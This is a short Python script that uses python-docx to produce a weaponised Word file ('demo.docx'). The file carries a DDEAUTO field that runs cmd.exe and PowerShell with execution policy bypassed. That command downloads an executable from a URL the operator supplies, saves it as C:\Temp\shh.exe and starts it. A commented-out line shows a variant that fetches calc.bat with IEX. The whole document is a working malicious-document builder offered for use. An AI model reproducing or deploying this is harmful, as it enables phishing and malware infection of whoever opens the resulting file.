from docx import Document
from docx.oxml import parse_xml
from docx.oxml.ns import nsdecls
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("url", type=str, help="url for downloading a malicious file")
args = parser.parse_args()

document = Document()
paragraph = document.add_paragraph()
p = paragraph._p
fld_xml = '<w:fldSimple %s w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k powershell -Nop -sta -ExecutionPolicy Bypass -c (New-Object System.Net.WebClient).DownloadFile(&apos;' + args.url + '&apos;,&apos; C:\\\\Temp\\\\shh.exe&apos;);Start-Process &apos;C:\\\\Temp\\\\shh.exe&apos;&quot; "/>' 
#fld_xml = '<w:fldSimple %s w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe /c http://127.0.0.1/calc.bat;IEX \$e"/>'
fld_xml = fld_xml % nsdecls('w')
fldSimple = parse_xml(fld_xml)
p.addnext(fldSimple)
document.save('demo.docx')
